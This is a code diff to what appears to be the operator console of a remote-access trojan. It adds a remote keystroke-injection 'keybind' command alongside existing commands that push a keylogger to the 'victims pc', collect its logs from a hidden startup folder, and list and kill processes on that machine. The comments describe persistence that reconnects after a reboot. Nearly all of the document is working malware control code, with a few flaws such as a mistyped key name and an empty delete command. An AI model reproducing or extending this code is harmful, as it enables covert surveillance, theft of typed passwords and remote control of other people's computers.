@@ -21,7 +21,7 @@ session_ids = []
 
 # saves all the command
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs"]
+SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs", "keybind"]
 
 
 class Commands:
@@ -115,7 +115,7 @@ class Commands:
                 return msg
 
         # sends the message
-        def sendMessage(msg):
+        def sendMessage(msg, recv=False):
             # sends the message length
             message_length = str(len(msg)).encode(FORMAT)
             message_length += b" " * (BUFFER - len(message_length))
@@ -124,7 +124,7 @@ class Commands:
             # sends the message
             conn.send(msg.encode(FORMAT))
             # checks if the sended command wants an input
-            if msg[2] == "o":
+            if msg[2] == "o" or recv:
                 returned = receiveMessage()
                 return returned
             else:
@@ -174,10 +174,12 @@ class Commands:
                 print("you need an argument type 'help' for more")
                 return
             else:
-                print("Those are too many arguments only one is allowed")
+                print("Those are too many arguments only one is allowed type 'help' for more.")
                 return
+        # shows all tasks with pid
         elif message == "ps":
             print(sendMessage("c o tasklist"))
+        # kills task with given pid
         elif message == "kill":
             # taskkill /im
             if args:
@@ -188,15 +190,17 @@ class Commands:
                     return
                 sendMessage(f"c x taskkill /im {args}")
             elif not args:
-                print("You need arguments, type 'help' for more")
+                print("You need arguments type 'help' for more.")
             else:
-                print("Those are too many arguments only one is allowed")
+                print("Those are too many arguments only one is allowed type 'help' for more.")
+        # installs a keylogger on the pc
         elif message == "keylogger":
             with open("extraScripts/keylogger.py", "r") as file:
                 sendMessage(file.read())
             if receiveMessage() == "err":
                 print("You need to install the shell")
                 return
+        # gets the keylogger logs
         elif message == "getlogs":
             exists = sendMessage("r o C:/$SysStartup/temp/logs.txt")
             if exists != "err":
@@ -205,6 +209,37 @@ class Commands:
             else:
                 print("Either wait for a logfile or install the keylogger.")
                 return
+        # deletes a file in given path
+        elif message == "delete":
+            pass
+
+        # sends a keybind
+        elif message == "keybind":
+            special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr", "back": "Key.backspace",
+                            "caps": "Key.caps_cock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc", "enter": "Key.enter",
+                            "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab"}
+            # checks for arguments
+            if args:
+                keysStr = args[0]
+                rawKeyLst = keysStr.split("+")
+                keyLst = []
+                # converts all keys into the key classes
+                for key in rawKeyLst:
+                    if len(key) == 1:
+                        keyLst.append(key)
+                    else:
+                        if key in special_keys:
+                            keyLst.append(special_keys[key])
+                        else:
+                            print(f"{key}, is not a valid key, check the readme file for all the keys")
+
+                sendMessage(f"k b {' '.join(keyLst)}")
+            elif not args:
+                print("You need to type the keybinds type 'help' for more.")
+            else:
+                print("Those are to many arguments type 'help' for more.")
+                return
+
 
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
